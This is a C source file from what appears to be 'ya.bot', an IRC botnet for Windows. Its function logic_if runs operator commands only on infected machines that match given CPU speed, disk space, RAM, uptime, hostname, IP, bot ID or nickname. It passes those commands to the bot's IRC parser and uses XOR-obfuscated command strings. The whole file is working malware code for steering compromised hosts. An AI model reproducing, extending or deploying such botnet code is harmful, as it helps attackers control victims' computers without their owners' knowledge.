/*  ya.bot  */

#include "bot.h"

#ifndef NO_LOGIC
bool logic_if(SOCKET bsock,
		WSAEVENT wsaEvent,
		int nServer,
		char *pszAction,
		char *pszDestination,
		char *pszMatch,
		char *pszParameter,
		char *pszCommand)
{
	bool bLogic = FALSE;
	char szBuffer[IRCBUF], szHost[LOWBUF];
	DWORD dwUptime;
	__int64 i64FreeBytes, i64TotalBytes;
	MEMORYSTATUS msMemory;

#ifndef NO_DEBUG
		debug_print("Doing logic, logic_if()");
#endif

//cpu
	if (strcmp(string_logiccpu, pszMatch) == 0)
	{
		if (info_cpuspeed() >= (DWORD)atoi(pszParameter))
				bLogic = TRUE;
	}
//disk
	else if (strcmp(string_logicdisk, pszMatch) == 0)
	{
			GetDiskFreeSpaceEx(NULL,
					NULL,
					(PULARGE_INTEGER)&i64TotalBytes,
					(PULARGE_INTEGER)&i64FreeBytes);
		if ((DWORD)(i64FreeBytes / 1048576) >= (DWORD)atoi(pszParameter))
				bLogic = TRUE;
	}
//host
	else if (strcmp(string_logichost, pszMatch) == 0)
	{
		if (gethostname(szHost, sizeof(szHost) - 1) == SOCKET_ERROR)
				return FALSE;
		if (wcstrcmp(szHost, pszParameter))
				bLogic = TRUE;
	}
//id
	else if ((strcmp(string_logicid,
					pszMatch) == 0) &&
			(wcstrcmp((char *)botid,
					pszParameter))) bLogic = TRUE;
//ip
	else if ((strcmp(string_logicip,
					pszMatch) == 0) &&
			(wcstrcmp(ip_getip(bsock),
					pszParameter))) bLogic = TRUE;
//nick
	else if ((strcmp(string_logicnick,
					pszMatch) == 0) &&
			(wcstrcmp(g_szBotNick,
					pszParameter))) bLogic = TRUE;
//ram
	else if (strcmp(string_logicram, pszMatch) == 0)
	{
			GlobalMemoryStatus(&msMemory);
		if ((msMemory.dwTotalPhys / 1048576) >= (DWORD)atoi(pszParameter))
				bLogic = TRUE;
	}
//uptime
	else if (strcmp(string_logicuptime, pszMatch) == 0)
	{
			dwUptime = GetTickCount() / 86400000;
		if (dwUptime >= (DWORD)atoi(pszParameter))
				bLogic = TRUE;
	}
	if (bLogic)
	{
			_snprintf(szBuffer, sizeof(szBuffer) - 1,
					string_logiccommand,
					g_szAuthedHost,
					pszAction,
					pszDestination,
					pszCommand,
					"\r\n");
			crypto_xorcommands();
			irc_parsebuffer(bsock, wsaEvent, szBuffer, nServer);
			crypto_xorcommands();
			return TRUE;
	}
		return FALSE;
}
#endif